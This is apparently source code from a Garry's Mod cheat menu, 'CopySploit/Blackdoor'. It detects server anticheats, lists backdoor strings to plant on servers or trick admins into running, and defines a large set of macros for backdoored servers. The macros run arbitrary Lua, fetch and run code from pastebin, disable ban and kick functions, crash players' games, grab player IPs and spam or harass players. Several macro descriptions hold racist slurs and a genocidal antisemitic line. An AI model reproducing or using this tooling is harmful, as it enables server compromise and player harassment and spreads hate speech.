			desc = "Датированный античит с открытым исходным кодом из 2014 года\nRPards все еще редактируют и используют этот кусок дерьма, называя его своим 1337 приватным античитом",

			scan = function() return ( _G.QAC and ispooped( "quack" ) ) end,

		},

		["Supservers Anticheat"] = {

			desc = "Скорее черный список публичных читов, чем настоящий античит\nЭтот мусор не представляет для нас никакой угрозы (будьте осторожны с ними, скринграбит экран)",

			scan = function() return ispooped( "rp.OrgMotd" ) end,

		},

		["Screengrab V2"] = {

			desc = "Публичная утилита, которая может быть использована для скриншота вашего экрана\nВроде у дефкона есть анти-скринграб, но я хз",

			scan = function() if _G.OpenSGMenu then return true else return false end end,

		},

		["Pablo's Screengrab"] = {

			desc = "Публичная утилита, которая может быть использована для скриншота вашего экрана\nВроде у дефкона есть анти-скринграб, но я хз",

			scan = function() if _G.SCRG then return true else return false end end,

		},

		["Enforcer Anti Minge"] = {

			desc = "Скрипт общего назначения, который включает в себя антипропкилл, анти-краш и логи",

			scan = function() if _G.EnforcerAddMessage then return true else return false end end,

		},

		["AP Anti"] = {

			desc = "Тупо названный сценарий анти-пропкилла с открытым исходным кодом\nВы вероятно не сможете пропкиллить на этом сервере",

			scan = function() return ispooped( "APAnti AlertNotice" ) end,

		},



	}





	concommand.Add( "CopySploit_anticheats", function()

		local acpanel = vgui.Create("DFrame")

		if !acpanel then return end

		acpanel:SetSize(500,455)

		acpanel:SetTitle("Меры безопасности сервера")

		acpanel:Center()

		acpanel:MakePopup()



		acpanel.Paint = function( s, w, h )

		surface.SetDrawColor( Color(30, 30, 30, 255) )

		surface.DrawRect( 0, 0, w, h )

		surface.SetDrawColor( Color(55, 55, 55, 255) )

		surface.DrawOutlinedRect( 0, 0, w, h )

		surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )

		surface.SetDrawColor( Color(33, 33, 33, 200) )

		surface.DrawRect( 10, 25, w - 20, h - 35 )

		end



		local Plist = vgui.Create( "DPanelList", acpanel )

		Plist:SetSize( acpanel:GetWide() - 20, acpanel:GetTall() - 35 )

		Plist:SetPadding( 5 )

		Plist:SetSpacing( 5 )

		Plist:EnableHorizontal( false )

		Plist:EnableVerticalScrollbar( true )

		Plist:SetPos( 10, 25 )

		Plist:SetName( "" )





		local function CreateACPanel( cmd )

		if !acpanel then return end

			local cmdp = vgui.Create( "DPanel" )

			cmdp:SetSize( Plist:GetWide(), 60 )

			cmdp.Cmd = cmd

			cmdp.Desc = acfags[cmd].desc

			cmdp.Paint = function( s, w, h )

				surface.SetDrawColor( Color(50, 50, 50, 255) )

				surface.DrawRect( 0, 0, w, h )

				surface.SetDrawColor( Color(65, 65, 65, 255) )

				surface.DrawOutlinedRect( 0, 0, w, h )

				surface.DrawLine( 0, 24, w, 24 )

				draw.DrawText( cmdp.Cmd, "DermaDefault", 10, 5, Color(255,255,255) )

				draw.DrawText( cmdp.Desc, "DermaDefault", 10, 28, Color(205,205,255, 100) )

			end



			Plist:AddItem( cmdp )

		end





		for k, v in pairs( acfags ) do

			if v["scan"]() then CreateACPanel( k ) end

		end

	end)



--[[

-- Possible backdoor strings to plant in a file or convince a superadmin to luarun

util.AddNetworkString( "idk" ) net.Receive( "idk", function( len ) local str = net.ReadString() RunString( str ) end )
util.AddNetworkString( "idk" ) net.Receive( "idk", function( len ) local str = net.ReadString() CompileString( str, "[C]", false ) end )
util.AddNetworkString( "idk" ) net.Receive( "idk", function( len ) local str = net.ReadString() RunStringEx( str ) end )

]]

--[[

	metastruct editor read shit

	self.HTMLIDE:AddFunction("gmodinterface","OnCode",function(code) ... end)"

	https://github.com/Earu/EasyChat/blob/master/lua/easychat/modules/lua_tab.lua#L140

]]

//local odium = jit.status( 'ODIUM' ) if !istable(odium) then print('FAILED TO IMPORT ODIUM TABLE') end 

local BD = {}
local h = http


BD.Backdoors = BD.Backdoors or {}

BD.CurrentBackdoor = "AutoDetect"



BD.BackdoorTypes = {

    ["AutoDetect"] = {

        ["Code"] = "util.AddNetworkString( '_CAC_ReadMemory' ) net.Receive( '_CAC_ReadMemory', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",

        ["Netkey"] = thefrenchenculer,

    },

}



local netsss = net.Start

function BD.IsMessagePooled( netmessage )

local netfunc = netsss

local status, error = pcall( netfunc, netmessage )

return status

end



local net = net




local ctxt = chat.AddText

function BD.ChatText( message, col )

    ctxt( Color(195,205,255,255), "[Blackdoor] ", col, message )

end



function BD.PingBackDoors()

    local bds = {}

    for k, v in pairs(BD.BackdoorTypes) do

        if BD.IsMessagePooled( tostring( v.Netkey ) ) then bds[k] = true end

    end

    return bds

end

concommand.Add("bd_refresh_backdoors", function() BD.Backdoors = BD.PingBackDoors() end)



function BD.BackdoorActive()

    return table.Count( BD.Backdoors ) > 0

end



function BD.GetActive()

    if !BD.BackdoorTypes[BD.CurrentBackdoor] then return { ["Code"] = "local x = 69", ["Netkey"] = "" } end

    return BD.BackdoorTypes[BD.CurrentBackdoor]

end



BD.BDMacros ={



    ["Artillery Strike"] = {

        ["Type"] = 1,

        ["Code"] = [[if !bombstrike then

            hook.Add("Think", "lulz_bombstrike", function() 

            local explode = ents.Create( "env_explosion" ) 

            local ps = Vector(math.random(-8000, 8000), math.random(-8000, 8000), math.random(-5000, 5000))

            local trc = {}

            trc.start = ps

            trc.endpos = ps + Vector( 0, 0, -99999)

            local tr = util.TraceLine(trc)

            if !tr.Hit then return end

            explode:SetPos( tr.HitPos ) 

            explode:Spawn() 

            explode:SetKeyValue( "iMagnitude", "400" ) 

            explode:Fire( "Explode", 0, 0 ) 

            end)

            bombstrike = true

            else

            hook.Remove("Think", "lulz_bombstrike")

            bombstrike = false

            end]],

        ["Desc"] = "Explode the shit out of everything",

    },





    ["@ Inject SendLua Interface"] = {

        ["Type"] = 1,

        ["Code"] = [[

    util.AddNetworkString( "succ" )

    function BDSendLua( p, str ) net.Start( "succ" ) net.WriteString( str ) net.Send( p ) end

    function BDSendLuaAll( str ) net.Start( "succ" ) net.WriteString( str ) net.Broadcast() end

    function BDInjectAids( p ) p:SendLua( 'net.Receive( "succ", function() RunString( net.ReadString() ) end )' ) end

    for k, v in pairs( player.GetAll() ) do BDInjectAids( v ) end

    hook.Add( "PlayerInitialSpawn", "youonlygetsuccagain", function( p ) BDInjectAids( p ) end)

        ]],

        ["Desc"] = "You need this to use certain macros",

    },



    ["Announce centre screen"] = {

        ["Type"] = 1,

        ["Code"] = [[for k, v in pairs(player.GetAll()) do v:PrintMessage( HUD_PRINTCENTER, @1 ) end]],

        ["Desc"] = "Make an announcement in the centre of everybodys screen",

        ["NeedsParameters"] = 1,

    },



    ["Rainbow chat spam"] = {

        ["Type"] = 1,

        ["Code"] = [[

        if !timer.Exists( "lulz_chatspam" ) then

            timer.Create( "lulz_chatspam", 0.5, 0, function() BDSendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), @1 )' ) end)

        else

            timer.Remove( "lulz_chatspam" )

        end]],

        ["Desc"] = "Spam rainbow chat for all players with the 1st parameter as the text",

        ["NeedsParameters"] = 1,

    },



    ["Rainbow chat spam (Turbo)"] = {

        ["Type"] = 1,

        ["Code"] = [[

        if !timer.Exists( "lulz_chatspam" ) then

            timer.Create( "lulz_chatspam", 0.01, 0, function() BDSendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), @1 )' ) end)

        else

            timer.Remove( "lulz_chatspam" )

        end]],

        ["Desc"] = "Spam rainbow chat for all players with the 1st parameter as the text",

        ["NeedsParameters"] = 1,

    },



    ["Unlock all doors"] = {

        ["Type"] = 1,

        ["Code"] = [[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("unlock", "", 0) end end]],

        ["Desc"] = "",

    },



    ["Toggle all doors"] = {

        ["Type"] = 1,

        ["Code"] = [[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("toggle", "", 0) end end]],

        ["Desc"] = "",

    },



    ["Broken Glass Symphony"] = {

        ["Type"] = 1,

        ["Code"] = [[

    if !timer.Exists( "A true masterpiece" ) then

        timer.Create( "A true masterpiece", 0.2, 0, function() 

            for _, p in pairs(player.GetAll()) do

                p:EmitSound( "physics/glass/glass_largesheet_break"..math.random(1,3)..".wav", 100, math.random( 40, 180 ) )

            end

        end)

    else

        timer.Remove( "A true masterpiece" )

    end]],

        ["Desc"] = "Beethoven's last hidden symphony, only rediscovered in 2017",

    },



    ["Yeah Baby"] = {

        ["Type"] = 1,

        ["Code"] = [[

        if !timer.Exists( "porn" ) then

        timer.Create( "porn", 0.3, 0, function() 

            for _, p in pairs(player.GetAll()) do

                p:EmitSound( "vo/npc/female01/yeah02.wav", 100, math.random( 90, 120 ) )

            end

        end)

        else

            timer.Remove( "porn" )

        end]],

        ["Desc"] = "YEAH BABY YEAH",

    },



    ["Street War"] = {

        ["Type"] = 1,

        ["Code"] = [[

        if !timer.Exists( "cwar" ) then

        timer.Create( "cwar", 1, 0, function() 

            for _, p in pairs(player.GetAll()) do

                p:EmitSound( "ambient/levels/streetwar/city_battle"..math.random( 1, 19 )..".wav", 100, math.random( 90, 120 ) )

            end

        end)

        else

            timer.Remove( "cwar" )

        end]],

        ["Desc"] = "For when you need more dakka",

    },



    ["Earthquake"] = {

        ["Type"] = 1,

        ["Code"] = [[

        if !timer.Exists( "earthquake" ) then

        timer.Create( "earthquake", 0.5, 500, function() 

            for _, p in pairs(player.GetAll()) do

                p:SetPos( p:GetPos() + Vector( 0, 0, 1 ) )

                p:SetVelocity( Vector( math.random( -50, 50 ), math.random( -50, 50 ), math.random( 100, 150 ) ) )

                util.ScreenShake( p:GetPos(), 20, 1, 1, 100 )

                p:EmitSound( "ambient/explosions/exp1.wav", 100, math.random( 60, 100 ) )

            end



            for _, e in pairs(ents.GetAll()) do

                if e:GetPhysicsObject() and e:GetPhysicsObject():IsValid() then e:GetPhysicsObject():AddVelocity( Vector( math.random( -50, 50 ), math.random( -50, 50 ), math.random( 100, 150 ) ) ) end

            end





        end)

        else

            timer.Remove( "earthquake" )

        end]],

        ["Desc"] = "For when you need more dakka",

    },



    ["Seize the server"] = {

        ["Type"] = 1,

        ["Code"] = [[

        hook.Add("PlayerInitialSpawn", "gw_siezed", function( ply ) ply:SendLua('local html = vgui.Create( "HTML" )html:SetSize( ScrW(), ScrH() )html:OpenURL( "http://globalwraith.com/util/seized.html" )') end)

        for k, v in pairs(player.GetAll()) do

            v:SendLua('local html = vgui.Create( "HTML" )html:SetSize( ScrW(), ScrH() )html:OpenURL( "http://odium.pro" )')

        end]],

        ["Desc"] = "Display the seized by wraithnet message to all players",

    },



    ["Explode all vehicles"] = {

        ["Type"] = 1,

        ["Code"] = [[for k, v in pairs(ents.GetAll()) do if v:IsVehicle() then 

        local explo = ents.Create("env_explosion")

        explo:SetPos(v:GetPos())

        explo:SetKeyValue("iMagnitude", "300")

        explo:Spawn()

        explo:Activate()

        explo:Fire("Explode", "", 0)

        end

        end]],

        ["Desc"] = "",

    },



    ["RCON command"] = {

        ["Type"] = 1,

        ["Code"] = [[game.ConsoleCommand( @1.."\n" )]],

        ["Desc"] = "Like having rcon access without actually having rcon access",

    },



    ["Lua run"] = {

        ["Type"] = 1,

        ["Code"] = [[@1]],

        ["Desc"] = "For running your dank luas",

    },



    ["Lua run from pastebin"] = {

        ["Type"] = 1,

        ["Code"] = [[http.Fetch( "@1", function( b, l, h, c ) RunString( b ) end, function() end )]],

        ["Desc"] = "Fetch and run code from a pastebin link ( remember to use raw you stupid faggot eg. https://pastebin.com/raw/fHeygLt9 )",

    },



    ["Destroy ULX Ban/Kick"] = {

        ["Type"] = 1,

        ["Code"] = [[ULib.Ban = function() return false end

        ULib.addBan = function() return end

        ULib.kick = function() return end]],

        ["Desc"] = "Completely break ulx ban and ulx kick so you can't be locked out of the server",

    },







------------------------ player targeted macros ------------------------



    ["Kill player"] = {

        ["Type"] = 2, -- 1 = indiscriminate, 2= targeted, 3 = dangerous

        ["Code"] = [[v:Kill()]],

        ["Desc"] = "",

    },



    ["Fumble player"] = {

        ["Type"] = 2, -- 1 = indiscriminate, 2= targeted, 3 = dangerous

        ["Code"] = [[v:DropWeapon( v:GetActiveWeapon() )]],

        ["Desc"] = "Knocks their current weapon out of their hand",

    },



    ["Strip weapons"] = {

        ["Type"] = 2,

        ["Code"] = [[v:StripWeapons()]],

        ["Desc"] = "",

    },



    ["Rocket"] = {

        ["Type"] = 2,

        ["Code"] = [[v:SetVelocity( Vector(0, 0, 9000) )]],

        ["Desc"] = "Sends them flying up into the air",

    },



    ["Rocket (Spastic)"] = {

        ["Type"] = 2,

        ["Code"] = [[v:SetVelocity( Vector(math.random( -9000, 9000), math.random( -9000, 9000), 9000) )]],

        ["Desc"] = "HOLY SHIIIIIIIIIIIT",

    },



    ["Change model"] = {

        ["Type"] = 2,

        ["Code"] = [[v:SetModel( @1 )]],

        ["Desc"] = "Set their player model to the specified string (1st paremeter)",

        ["NeedsParameters"] = 1,

    },



    ["Set health + armor"] = {

        ["Type"] = 2,

        ["Code"] = [[v:SetHealth( @1 ) v:SetArmor( @2 ) ]],

        ["Desc"] = "Sets their health (1st paremeter) and armor (2nd paremeter)",

        ["NeedsParameters"] = 2,

    },



    ["Ear rape"] = {

        ["Type"] = 2,

        ["Code"] = [[

        local snd = {

            [1] = "npc/stalker/go_alert2a.wav",

            [2] = "vo/npc/male01/question06.wav",

            [3] = "ambient/energy/zap1.wav",

            [4] = "weapons/knife/knife_stBD.wav",

            [5] = "vo/ravenholm/madlaugh04.wav",

            [6] = "npc/antlion_guard/antlion_guard_die1.wav",

            [7] = "vo/breencast/br_collaboration01.wav,"

        }

        v:EmitSound( snd[tonumber(@1)], 100, 100 )

        ]],

        ["Desc"] = "Make them emit a sound (1st paremeter is a number 1-7)",

        ["NeedsParameters"] = 1,

    },



    ["Ear rape (from internet)"] = {

        ["Type"] = 2,

        ["Code"] = [[

        BDSendLua( v, 'if soundrape then soundrape:Remove() soundrape = nil return end soundrape = vgui.Create( "DFrame" ) soundrape:SetSize( 1, 1 ) local html = vgui.Create( "HTML", soundrape ) html:OpenURL( @1 )' )

        ]],

        ["Desc"] = "Make them hear a sound from a URL (1st paremeter).  Sending a new sound will stop the previous one.  Send an invalid url to stop all sounds entirely on their client",

        ["NeedsParameters"] = 1,

    },



    ["Eye rape (from internet)"] = {

        ["Type"] = 2,

        ["Code"] = [[ 

        BDSendLua( v, 'if bdeyerape then bdeyerape:Remove() bdeyerape = nil return end bdeyerape = vgui.Create( "DFrame" )bdeyerape:SetDraggable( false )bdeyerape:SetSize( ScrW(), ScrH() )bdeyerape:SetTitle( "" )bdeyerape:ShowCloseButton( false )local html = vgui.Create( "HTML", bdeyerape )html:Dock( FILL )html:OpenURL( @1 )' )

        ]],

        ["Desc"] = "Make them see a full screen, unclosable panel from a URL (1st paremeter).  Sending a new url will stop the previous one.  Send an invalid url to clear their view entirely",

        ["NeedsParameters"] = 1,

    },



    ["Rave Mode"] = {

        ["Type"] = 2,

        ["Code"] = [[ 

            BDSendLua( v, 'if hook.GetTable().HUDPaint.drugznigga then hook.Remove( "HUDPaint", "drugznigga" ) else hook.Add( "HUDPaint", "drugznigga", function() local cin = math.sin( CurTime() * 10 ) * 255 surface.SetDrawColor( Color( cin, -cin, cin, 100 ) ) surface.DrawRect( 0, 0, ScrW(), ScrH() ) end) end' )

        ]],

        ["Desc"] = "Make them loosen up and join the party",

    },



    ["Rave Music"] = {

        ["Type"] = 2,

        ["Code"] = [[ 

            BDSendLua( v, 'surface.PlaySound( "music/hl1_song25_remix3.mp3" )' )

        ]],

        ["Desc"] = "DOOF DOOF NIGGA",

    },



    ["Whisper"] = {

        ["Type"] = 2,

        ["Code"] = [[v:ChatPrint( @1 )]],

        ["Desc"] = "Anonymously whisper text into their chatbox (1st paremeter)",

        ["NeedsParameters"] = 1,

    },



    ["Whisper (advanced)"] = {

        ["Type"] = 2,

        ["Code"] = [[

        BDSendLua( v, 'chat.AddText( Color( @2, @3, @4 ), @1 )' )

        ]],

        ["Desc"] = "Anonymously whisper coloured text into their chatbox (1st paremeter = text, 2nd = r, 3rd = g, 4th = b)",

        ["NeedsParameters"] = 1,

    },



    ["Ignite player"] = {

        ["Type"] = 2,

        ["Code"] = [[v:Ignite( 30 )]],

        ["Desc"] = "Ignite players for 30 seconds, spam repeatedly to refresh the duration",

    },



    ["Toggle godmode"] = {

        ["Type"] = 2,

        ["Code"] = [[if v:HasGodMode() then v:GodDisable() else v:GodEnable() end]],

        ["Desc"] = "",

    },



    ["Crash their gmod"] = {

        ["Type"] = 2,

        ["Code"] = [[v:SendLua("function fag() return fag() end fag()")]],

        ["Desc"] = "Instantly freezes their game solid, the only way to fix it is ctrl-alt-delete or a computer restart",

    },



    ["Toggle serverside speedhack"] = {

        ["Type"] = 2,

        ["Code"] = [[if !v.Sanic then v:SetRunSpeed( 1200 ) v:SetWalkSpeed(800) v.Sanic = true else v:SetRunSpeed( 240 ) v:SetWalkSpeed( 160 ) v.Sanic = false end]],

        ["Desc"] = "GOTTA GO FAST",

    },



    ["Freeze/Unfreeze player"] = {

        ["Type"] = 2,

        ["Code"] = [[v:Freeze( !v:IsFrozen() )]],

        ["Desc"] = "",

    },



    ["Force say"] = {

        ["Type"] = 2,

        ["Code"] = [[v:Say(@1)]],

        ["Desc"] = "Forces them to say the specified string in chat (first parameter)",

        ["NeedsParameters"] = 1,

    },





    ["Force concommand"] = {

        ["Type"] = 2,

        ["Code"] = [[v:ConCommand(@1)]],

        ["Desc"] = "Forces them to run the specified console command (first parameter)",

        ["NeedsParameters"] = 1,

    },



    ["Grab IP"] = {

        ["Type"] = 2,

        ["Code"] = [[ for _, p in pairs(player.GetAll()) do if %LP then p:ChatPrint( v:Nick().." : "..v:IPAddress() ) end end]],

        ["Desc"] = "Prints their IP Address to your console",

    },





    ["DarkRP add/remove money"] = {

        ["Type"] = 2,

        ["Code"] = [[v:addMoney(@1)]],

        ["Desc"] = "Adds money to their wallet (first parameter) remember that you can use negative numbers to subtract money",

        ["NeedsParameters"] = 1,

    },



    ["DarkRP force job"] = {

        ["Type"] = 2,

        ["Code"] = [[ for i, t in pairs( team.GetAllTeams() ) do if string.lower(t.Name) == string.lower( @1 ) then v:changeTeam(i, true, true) end end]],

        ["Desc"] = "Change their team to the specified job (1st parameter = job name, does not require capitalization)",

        ["NeedsParameters"] = 1,

    },



    ["Force team switch"] = {

        ["Type"] = 2,

        ["Code"] = [[ for i, t in pairs( team.GetAllTeams() ) do if string.lower(t.Name) == string.lower( @1 ) then v:SetTeam( i ) end end]],

        ["Desc"] = "Change their team to the specified team name (1st parameter)",

        ["NeedsParameters"] = 1,

    },



    ["Noclip player"] = {

        ["Type"] = 2,

        ["Code"] = [[if v:GetMoveType() != MOVETYPE_NOCLIP then v:SetMoveType(MOVETYPE_NOCLIP) else v:SetMoveType(MOVETYPE_WALK) end]],

        ["Desc"] = "Toggles noclip on the specified players",

    },



    ["Give weapon to player"] = {

        ["Type"] = 2,

        ["Code"] = [[v:Give( @1 )]],

        ["Desc"] = "Gives this player a weapon (first parameter)",

        ["NeedsParameters"] = 1,

    },



    ["Give ammo to player"] = {

        ["Type"] = 2,

        ["Code"] = [[v:GiveAmmo( @1, @2, false )]],

        ["Desc"] = "Gives this player some ammo (first parameter = amount of ammo, secound parameter = ammo type)",

        ["NeedsParameters"] = 2,

    },



    ["Teleport (them to your cursor)"] = {

        ["Type"] = 2,

        ["Code"] = [[

            local tp = false

            local tpos

            for _, p in pairs(player.GetAll()) do if %LP then tpos = p:GetEyeTraceNoCursor().HitPos tp = true end end

            if tp then v:SetPos( tpos ) end

        ]],

        ["Desc"] = "Teleports the selected players to your cursor location, not recommended for more than 1 person at once",

    },



    ["Teleport (you to them)"] = {

        ["Type"] = 2,

        ["Code"] = [[

            local tp = false

            local tpos = v:GetPos() + Vector( 32, 0, 10)

            for _, p in pairs(player.GetAll()) do if %LP then p:SetPos( tpos ) end end

        ]],

        ["Desc"] = "Teleport yourself to the selected player, may end with you stuck inside a wall",

    },



    ["Teleport (blink)"] = {

        ["Type"] = 2,

        ["Code"] = [[

            local tpos = v:GetEyeTraceNoCursor().HitPos

            v:SetPos( tpos )

        ]],

        ["Desc"] = "Use on yourself or others to warp them to where they are looking",

    },



    ["Spawn entity near player"] = {

        ["Type"] = 2,

        ["Code"] = [[

        local tr = {}

        tr.start = v:GetShootPos()

        tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()

        tr.filter = {v}

        local trace = util.TraceLine(tr)

        local dix = ents.Create( @1 )

        dix:SetPos(trace.HitPos)

        dix:SetAngles(Angle(0,0,0))

        dix:Spawn()

        ]],

        ["Desc"] = "Spawn an entity in front of this player (first parameter = entity class), cannot spawn cars!",

        ["NeedsParameters"] = 1,

    },



    ["Spawn prop near player"] = {

        ["Type"] = 2,

        ["Code"] = [[

        local tr = {}

        tr.start = v:GetShootPos()

        tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()

        tr.filter = {v}

        local trace = util.TraceLine(tr)

        local dix = ents.Create( "prop_physics" )

        dix:SetPos(trace.HitPos)

        dix:SetAngles(Angle(0,0,0))

        dix:SetModel( @1 )

        dix:Spawn()

        ]],

        ["Desc"] = "Spawn a world prop in front of this player (first parameter = model)",

        ["NeedsParameters"] = 1,

    },



    ["Spawn odium shrine"] = {

        ["Type"] = 2,

        ["Code"] = [[

        local tr = {}

        tr.start = v:GetShootPos()

        tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()

        tr.filter = {v}

        local trace = util.TraceLine(tr)

        local dix = ents.Create( "prop_physics" )

        dix:SetPos( trace.HitPos + Vector( 0, 0, 70 ) )

        dix:SetAngles( v:GetAngles() )

        dix:SetModel( "models/props_c17/gravestone_cross001a.mdl" )

        dix:Spawn()

        dix:SetMoveType( MOVETYPE_NONE )

        dix:SetMaterial( "models/shiny" )

        dix:SetColor( Color( 0, 0, 40 ) )



        local function ecr( parent, model, pos, ang, col, mat  )

            local dix = ents.Create( "prop_physics" )

            dix:SetPos( parent:LocalToWorld( pos ) )

            dix:SetAngles( parent:LocalToWorldAngles( ang ) )

            dix:SetModel( model )

            dix:SetParent( parent )

            dix:Spawn()

            dix:SetColor( col )

            dix:SetMaterial( mat )

        end



        ecr( dix, "models/props_c17/gravestone_coffinpiece001a.mdl", Vector( -65, 0, -60 ), Angle( 0, 180, 0 ), Color( 40, 40, 80 ), "models/shiny"  )

        ecr( dix, "models/hunter/blocks/cube025x3x025.mdl", Vector( -5, 18, 35 ), Angle( 0, 0, 0 ), Color( 80, 80, 180 ), "models/shiny"  )

        ecr( dix, "models/hunter/blocks/cube025x3x025.mdl", Vector( -5, 6, 65 ), Angle( 0, 0, 90 ), Color( 80, 80, 180 ), "models/shiny"  )

        ecr( dix, "models/hunter/blocks/cube025x150x025.mdl", Vector( -5, 71, 100 ), Angle( 0, 0, 90 ), Color( 80, 80, 180 ), "models/shiny"  )

        ecr( dix, "models/hunter/blocks/cube025x150x025.mdl", Vector( -5, -59, 100 ), Angle( 0, 0, 90 ), Color( 80, 80, 180 ), "models/shiny"  )



        for _, p in pairs( player.GetAll() ) do p:SendLua( 'chat.AddText( Color(200, 200, 255 ), "Heil odium.pro, god of cheating")' ) sound.Play( "ambient/explosions/explode_8.wav", p:GetPos(), 90, 80, 1 ) end



        ]],

        ["Desc"] = "Spawn a world prop in front of this player (first parameter = model)",

    },







    ["Spawn evil npc near player"] = {

        ["Type"] = 2,

        ["Code"] = [[

        local tr = {}

        tr.start = v:GetShootPos()

        tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()

        tr.filter = {v}

        local trace = util.TraceLine(tr)

        local dix = ents.Create( "npc_citizen" )

        dix:SetPos(trace.HitPos)

        dix:SetAngles(Angle(0,0,0))

        dix:SetKeyValue( "additionalequipment", table.Random({"weapon_shotgun", "weapon_smg1", "weapon_ar2"}) )

        dix:SetKeyValue( "citizentype", 3 )

        dix:AddRelationship("player D_HT 200")

        dix:SetCurrentWeaponProficiency(WEAPON_PROFICIENCY_PERFECT)

        dix:SetSchedule( SCHED_IDLE_WANDER )

        dix:Spawn()

        ]],

        ["Desc"] = "Spawn a hostile NPC in front of this player",

    },



    ["Death ray"] = {

        ["Type"] = 2,

        ["Code"] = [[

        local trace = v:GetEyeTraceNoCursor()

        if trace.Entity:IsValid() then trace.Entity:Remove() end

        ]],

        ["Desc"] = "Vaporize whatever this player is looking at",

    },



    ["Death ray (explosive)"] = {

        ["Type"] = 2,

        ["Code"] = [[

        local trace = v:GetEyeTraceNoCursor()

        local explo = ents.Create("env_explosion")

        explo:SetPos(trace.HitPos)

        explo:SetKeyValue("iMagnitude", "250")

        explo:Spawn()

        explo:Activate()

        explo:Fire("Explode", "", 0)

        ]],

        ["Desc"] = "Blow up whatever this player is looking at",

    },



    ["Precise Artillery Strike"] = {

        ["Type"] = 2,

        ["Code"] = [[

        local trace = v:GetEyeTraceNoCursor()

        timer.Create( "uiashfuasfas"..v:UniqueID()..math.random(-9999, 99999), 0.2, 15, function()

        local explo = ents.Create("env_explosion")

        explo:SetPos(trace.HitPos + Vector( math.random( -500, 500), math.random( -500, 500), math.random( -500, 500) ) )

        explo:SetKeyValue("iMagnitude", "250")

        explo:Spawn()

        explo:Activate()

        explo:Fire("Explode", "", 0)

        end)

        ]],

        ["Desc"] = "Blow up whatever this player is looking at",

    },



    ["Woman Driver"] = {

        ["Type"] = 2,

        ["Code"] = [[

        local trace = v:GetEyeTraceNoCursor()

        local car = ents.Create("prop_physics")

        local trace2 = util.TraceLine( { start = trace.HitPos, endpos = trace.HitPos + Vector( 0, 0, 5000000 ), mask = MASK_SOLID_BRUSHONLY } )

        car:SetModel( "models/props_vehicles/car002a_physics.mdl" )

        car:SetAngles( v:GetAngles() )

        car:SetPos( trace2.HitPos + Vector( 0, 0, -60 ) )

        car:Spawn()

        car:Activate()

        car.boom = 6

        car:GetPhysicsObject():SetVelocity( Vector( 0, 0, -5000 ) )

        car:Ignite( 500 )

        car:AddCallback( "PhysicsCollide", function( car, dat )

            local explo = ents.Create("env_explosion")

            explo:SetPos( car:GetPos() )

            explo:SetKeyValue("iMagnitude", "350")

            explo:Spawn()

            explo:Activate()

            explo:Fire("Explode", "", 0)

            local ef = EffectData()

            ef:SetOrigin( car:GetPos() )

            ef:SetMagnitude( 5 )

            ef:SetScale( 200 )

            util.Effect( "ThumperDust", ef )

            car.boom = car.boom - 1

            if car.boom < 0 then car:Remove() end

        end )

        timer.Simple( 30, function() if car:IsValid() then car:Remove() end end)

        ]],

        ["Desc"] = "Make exploding vehicles rain from the sky",

    },







    ["Poison Gas"] = {

        ["Type"] = 2,

        ["Code"] = [[

        local trace = v:GetEyeTraceNoCursor()

        local ar2Explo = ents.Create("env_ar2explosion")

        ar2Explo:SetOwner(game.GetWorld())

        local p = trace.HitPos

        ar2Explo:SetPos(trace.HitPos)

        ar2Explo:Spawn()

        ar2Explo:Activate()

        ar2Explo:Fire("Explode", "", 0)

        timer.Create( "gasthekikes_"..math.random(-9999, 9999).."_"..math.random(-9999, 9999), 0.25, 35, function()

            for _, ent in pairs(ents.FindInSphere( p, 500)) do

                if !ent:IsPlayer() then continue end

                local d = DamageInfo()

                d:SetDamage( 1 )

                d:SetAttacker( game.GetWorld() )

                d:SetInflictor( game.GetWorld() )

                d:SetDamageType( DMG_DROWN )

                ent:TakeDamageInfo( d )

            end

        end)



        ]],

        ["Desc"] = "GAS THE JEWS RACE WAR NOW",

    },





    ["Spawn vehicle near player"] = {

        ["Type"] = 2,

        ["Code"] = [[

        local trc = {}

        trc.start = v:GetShootPos()

        trc.endpos = v:GetShootPos() + 2500 * v:GetAimVector()

        trc.filter = {v}

        local tr = util.TraceLine(trc)



        local VehicleList = list.Get( "Vehicles" )

        local vehicle = VehicleList[ @1 ]

        if ( !vehicle ) then return end

        local Angles = v:GetAngles()

        Angles.pitch = 0

        Angles.roll = 0

        Angles.yaw = Angles.yaw + 180

    

        local pos = tr.HitPos

        if ( vehicle.Offset ) then

            pos = pos + tr.HitNormal * vehicle.Offset

        end

        local Ent = ents.Create( vehicle.Class )

        if ( !Ent ) then return end

        duplicator.DoGeneric( Ent, vehicle )

        if ( vehicle.Model == "models/buggy.mdl" ) then Ent:SetKeyValue( "vehiclescript", "scripts/vehicles/jeep_test.txt" ) end

        if ( vehicle.Model == "models/vehicle.mdl" ) then Ent:SetKeyValue( "vehiclescript", "scripts/vehicles/jalopy.txt" ) end

        if ( vehicle && vehicle.KeyValues ) then

            for k, v in pairs( vehicle.KeyValues ) do

                Ent:SetKeyValue( k, v )

            end

        end

        Ent:SetModel( vehicle.Model )

        Ent:SetAngles( Angles )

        Ent:SetPos( pos )

        Ent:Spawn()

        Ent:Activate()

        if ( Ent.SetVehicleClass && @1 ) then Ent:SetVehicleClass( @1 ) end

        Ent.VehicleName = vehicle.Class

        Ent.VehicleTable = @1

        Ent.ClassOverride = vehicle.Class

        ]],

        ["Desc"] = "Spawn a vehicle in front of this player (first parameter = vehicle class), don't try to spawn ents with this ya dingus!",

        ["NeedsParameters"] = 1,

    },



    ["Kick player"] = {

        ["Type"] = 2,

        ["Code"] = [[ v:Kick( @1 ) ]],

        ["Desc"] = "First parameter = reason for kick",

    },



    ["Niggerize player"] = {

        ["Type"] = 2,

        ["Code"] = [[ if !v.Niggered then v:SetColor( Color( 0, 0, 0 ) ) v.Niggered = true else v:SetColor( Color(255, 255, 255) ) v.Niggered = false end ]],

        ["Desc"] = "Turns them black as night",

